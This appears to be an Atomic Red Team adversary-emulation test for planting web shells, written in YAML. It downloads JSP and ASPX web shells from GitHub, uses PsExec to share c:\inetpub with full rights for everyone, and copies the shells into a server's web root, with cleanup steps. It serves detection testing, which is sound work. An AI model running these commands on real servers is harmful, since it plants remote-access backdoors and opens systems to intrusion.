attack_technique: T1505.003A
display_name: 'Server Software Component: Web Shell'
atomic_tests:
- name: Web Shell Written to Disk
  auto_generated_guid: 8616b4ec-1272-440f-8c40-5afb1010082b
  description: |
    This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.
    Idea from APTSimulator.
    cmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
  supported_platforms:
  - windows
  input_arguments:
    server:
      description: server's IP
      type: String
      default: '192.168.204.100'    
    web_shells:
      description: Path of Web Shell
      type: path
      default: PathToAtomicsFolder\T1505.003A\src    
    psexec_exe:
      description: Path to PsExec executable
      type: Path
      default: PathToAtomicsFolder\T1505.003A\bin\PsExec64.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Web shell must exist on disk at specified location (#{web_shells})
    prereq_command: |
      if (Test-Path #{web_shells}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path #{web_shells}) -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp" -OutFile "#{web_shells}/b.jsp"
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp" -OutFile "#{web_shells}/tests.jsp"
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx" -OutFile "#{web_shells}/cmd.aspx"
  executor:
    command: |
      #{psexec_exe} \\#{server} net share inetpub=c:\inetpub /grant:everyone,full
      net use \\#{server}\inetpub
      xcopy /I /Y #{web_shells} \\#{server}\inetpub\wwwroot
    cleanup_command: |      
      del \\#{server}\inetpub\wwwroot\b.jsp /q >nul 2>&1
      del \\#{server}\inetpub\wwwroot\tests.jsp /q >nul 2>&1
      del \\#{server}\inetpub\wwwroot\cmd.aspx /q >nul 2>&1
      net use \\#{server}\inetpub /delete
      #{psexec_exe} \\#{server} net share inetpub /delete
    name: command_prompt